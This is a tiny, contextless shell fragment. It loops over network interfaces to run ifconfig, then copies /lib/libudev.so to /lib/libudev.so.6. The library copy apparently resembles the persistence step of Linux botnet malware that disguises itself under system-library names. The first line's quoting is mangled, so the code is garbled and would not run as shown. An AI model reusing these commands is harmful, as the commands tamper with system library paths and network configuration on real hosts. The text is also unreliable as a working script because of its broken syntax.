for i in 'cat /proc/net/dev | grep :| awk -F: {'print $1'}'; do ifconfig $i ip& done

cp /lib/libudev.so /lib/libudev.so.6

